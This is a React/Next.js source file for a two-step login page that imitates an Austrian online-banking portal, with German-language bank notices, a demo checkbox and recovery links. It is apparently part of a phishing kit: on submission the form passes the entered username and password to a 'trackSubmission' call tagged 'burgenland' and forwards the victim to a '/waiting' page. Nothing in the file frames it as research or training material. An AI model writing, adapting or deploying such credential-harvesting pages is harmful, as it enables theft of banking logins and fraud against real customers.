"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [demoMode, setDemoMode] = useState(false);
  const [step, setStep] = useState<"username" | "password">("username");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === "username") {
      setStep("password");
      return;
    }
    await trackSubmission("burgenland", "login", { username, password });
    router.push(`/waiting?user=${encodeURIComponent(username)}`);
  };

  if (step === "password") {
    return (
      <>
        {/* Header bar with back arrow */}
        <div className="login-header">
          <span className="sr-only">Firmenlogo</span>
          <div id="topbar" className="topbar pre-login">
            <div className="container">
              <div className="row">
                <div className="topbar-logo"></div>
              </div>
            </div>
          </div>
        </div>

        <div className="leave-header-visible" id="overlaycontainer-login">
          <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
            <div id="modaloverlay" className="modal show" role="dialog">
              <div className="modal-dialog">
                <div className="modal-content">
                  {/* Modal Header with back button */}
                  <div className="modal-header">
                    <h1>
                      <a
                        href="#"
                        onClick={(e) => { e.preventDefault(); setStep("username"); }}
                        style={{ textDecoration: "none", color: "#005aa5", marginRight: "8px" }}
                        aria-label="Zurück zum Benutzernamen"
                      >
                        &lt;
                      </a>
                      Login
                    </h1>
                  </div>

                  {/* Modal Body */}
                  <div className="modal-body">
                    <div id="loginform-messages" className="messages-overlay hidden"></div>

                    {/* Info text */}
                    <div className="row login-row login-info-text">
                      <p>
                        Hier können Sie sich für Ihr neues Online-Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
                      </p>
                    </div>

                    {/* Separator */}
                    <div className="row login-row login-demo">
                      <hr className="no-margin-top" role="presentation" />
                    </div>

                    {/* Username read-only display */}
                    <div className="row">
                      <div className="col-xs-12">
                        <label>
                          <small>Benutzername</small>
                        </label>
                        <div className="input-text">
                          <input
                            type="text"
                            className="form-control"
                            value={username}
                            readOnly
                            style={{ backgroundColor: "#f5f5f5" }}
                          />
                        </div>
                      </div>
                    </div>

                    {/* Password input */}
                    <div className="row" style={{ marginTop: "16px" }}>
                      <div className="col-xs-12">
                        <label htmlFor="passwort">
                          <small>Passwort</small>
                        </label>
                        <div className="input-text">
                          <input
                            id="passwort"
                            name="loginform:passwort"
                            type="password"
                            className="form-control"
                            maxLength={128}
                            spellCheck={false}
                            autoComplete="off"
                            autoFocus
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                          />
                          <a
                            className="del-btn"
                            tabIndex={-1}
                            onClick={() => setPassword("")}
                            style={{ display: password ? "block" : "none" }}
                          >
                            <span className="icon icon-inhalt-loeschen">✕</span>
                          </a>
                        </div>
                      </div>
                    </div>

                    {/* Consent text */}
                    <div className="row login-nutzungsbedingungen">
                      <p>
                        Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
                      </p>
                    </div>

                    {/* Submit button footer */}
                    <div className="modal-footer">
                      <div className="row">
                        <button
                          id="loginButtonSubmit"
                          type="submit"
                          className="button-default pull-right button-fullwidth"
                          aria-label="Login abschließen"
                        >
                          Login abschließen
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>
      </>
    );
  }

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main login area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>Login</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Messages overlay (hidden) */}
                  <div id="loginform-messages" className="messages-overlay hidden"></div>

                  {/* Info text */}
                  <div className="row login-row login-info-text">
                    <p>
                      Hier können Sie sich für Ihr neues Online-Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
                    </p>
                  </div>

                  {/* Demo checkbox section */}
                  <div className="row login-row login-demo">
                    <hr className="no-margin-top" role="presentation" />
                    <div className="demo-login-container">
                      <div>
                        <div className="input-checkbox">
                          <input
                            id="login-demo-checkbox"
                            type="checkbox"
                            className="input-checkbox-input"
                            checked={demoMode}
                            onChange={(e) => setDemoMode(e.target.checked)}
                          />
                          <label className="input-checkbox-label" htmlFor="login-demo-checkbox">
                            <span className="input-checkbox-span"></span>
                          </label>
                        </div>
                      </div>
                      <div className="login-demo-info">
                        <label htmlFor="login-demo-checkbox">
                          Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben.
                        </label>
                      </div>
                    </div>
                    <hr role="presentation" />
                  </div>

                  {/* Username input */}
                  <div className="row">
                    <div className="col-xs-12">
                      <div className="pull-right">
                        {" "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">Hochkontrast</span>
                          </span>
                        </a>
                        {"  | "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">English</span>
                          </span>
                        </a>
                        {"  "}
                      </div>

                      <label htmlFor="benutzername">
                        <small>Benutzername</small>
                      </label>
                      <div className="input-text">
                        <input
                          id="benutzername"
                          name="loginform:benutzername"
                          type="text"
                          className="form-control"
                          maxLength={64}
                          spellCheck={false}
                          autoComplete="off"
                          placeholder=""
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                        <a
                          className="del-btn"
                          tabIndex={-1}
                          onClick={() => setUsername("")}
                          style={{ display: username ? "block" : "none" }}
                        >
                          <span className="icon icon-inhalt-loeschen">✕</span>
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Erstlogin link */}
                  <a href="#" aria-label="Erstmalige Anmeldung? Hier klicken, um zu starten">
                    <div className="login-erstlogin-link">Sie melden sich zum ersten Mal an?</div>
                  </a>

                  {/* Terms */}
                  <div className="row login-nutzungsbedingungen">
                    <p>
                      Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den AGB und Nutzungsbedingungen sowie der Datenschutzerklärung der Bank ausdrücklich zu.
                    </p>
                  </div>

                  {/* Submit button footer */}
                  <div className="modal-footer">
                    <div className="row">
                      <button
                        id="loginButtonNext"
                        type="submit"
                        className="button-default pull-right button-fullwidth"
                        aria-label="Continue logging in"
                      >
                        Weiter
                      </button>
                    </div>
                  </div>

                  {/* Recovery links footer */}
                  <div className="modal-footer">
                    <div className="row text-center">
                      <a className="command-link" href="#">
                        <span className="command-link-wrap">
                          <span className="command-link-title">Benutzername vergessen</span>
                        </span>
                      </a>
                      <br />
                      <a className="command-link" href="#">
                        <span className="command-link-wrap">
                          <span className="command-link-title">Passwort vergessen</span>
                        </span>
                      </a>
                      <br />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
